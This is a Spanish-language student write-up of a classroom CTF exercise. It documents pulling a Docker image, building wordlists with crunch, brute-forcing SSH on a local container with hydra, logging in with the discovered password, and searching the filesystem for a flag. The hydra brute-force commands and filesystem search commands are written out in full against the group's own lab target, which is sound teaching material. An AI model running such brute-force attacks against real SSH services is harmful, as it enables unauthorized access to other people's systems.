# Creando CTF's

# 🛡️ Reto CTF: Ubuntu con SSH y Usuario 'Legion'

## 🎯 Objetivo
Acceder vía SSH a un contenedor Docker con usuario `legion`, cuya contraseña debe ser descubierta a través de fuerza bruta basada en un acertijo. Se utilizaron herramientas como `crunch` e `hydra` para automatizar el proceso.

---

## 🧱 1. Preparación del entorno

### Descargar imagen del contenedor
```bash
docker pull jaiderospina/retoctf:1.0

Ejecutar contenedor en segundo plano


docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0
Solución a conflicto de nombre


docker rm -f mi-contenedor-ssh
🔍 2. Verificación del contenedor


docker ps
Confirmó contenedor activo y SSH escuchando en puerto 2222.

🧠 3. Análisis del acertijo
Cinco letras ocultas en las palabras estrella, selva, dedo, gato...
Hipótesis principal: combinación tipo esdeg, ESDEG, etc.

🧰 4. Generación de diccionarios con Crunch
Lista basada en patrón:


crunch 5 5 -t ES%%O -o esdeo.lst
Lista reducida:


crunch 5 5 estdgo -o reducido.lst
Lista ampliada:


crunch 5 5 estdogal -o ampliada.lst
Lista completa (opcional):


crunch 5 5 abcdefghijklmnopqrstuvwxyz -o full.lst
⚔️ 5. Ataques con Hydra
Comando base usado:



hydra -t 4 -l legion -P [archivo] -s 2222 localhost ssh
Diccionarios probados:

esdeo.lst ❌

reducido.lst ❌

ampliada.lst ❌

👣 6. Verificación manual de servicio SSH


ssh legion@localhost -p 2222
Confirmado: SSH activo y pidiendo contraseña.

🎯 7. Ataque exitoso con combinaciones personalizadas
Crear wordlist:


echo -e "esdeg\nESDEG\nEsdeg\neSdeg\nesDEG\neSdEg\nEsDEg\nESDeg\nesDEg\nEsdEg" > combinadas.lst
Ejecutar Hydra:


hydra -l legion -P combinadas.lst -s 2222 localhost ssh

✅ Resultado:

css


[22][ssh] host: localhost login: legion password: Esdeg
🔐 8. Acceso SSH exitoso


ssh legion@localhost -p 2222
# Contraseña: Esdeg
🕵️ 9. Búsqueda de bandera
Comandos usados:


ls -la
cat flag.txt
find / -name "*flag*" 2>/dev/null
cat /etc/motd
grep -r "CTF{" /home 2>/dev/null
❌ No se encontró bandera explícita en el contenedor.

🧠 Lecciones aprendidas
Uso táctico de crunch para generar diccionarios.

Dominio de hydra con control de tareas (-t).

Verificación previa de puertos y servicio SSH.

Importancia de considerar variantes en uso de mayúsculas.

Documentación detallada del proceso paso a paso.

Contraseña final encontrada: Esdeg
Usuario: legion
Puerto: 2222

📁 Autor: [grupo 4 - ]
📅 Fecha: Julio 2025
🎓 Proyecto académico – Electiva Habilidades Prácticas CTF



---
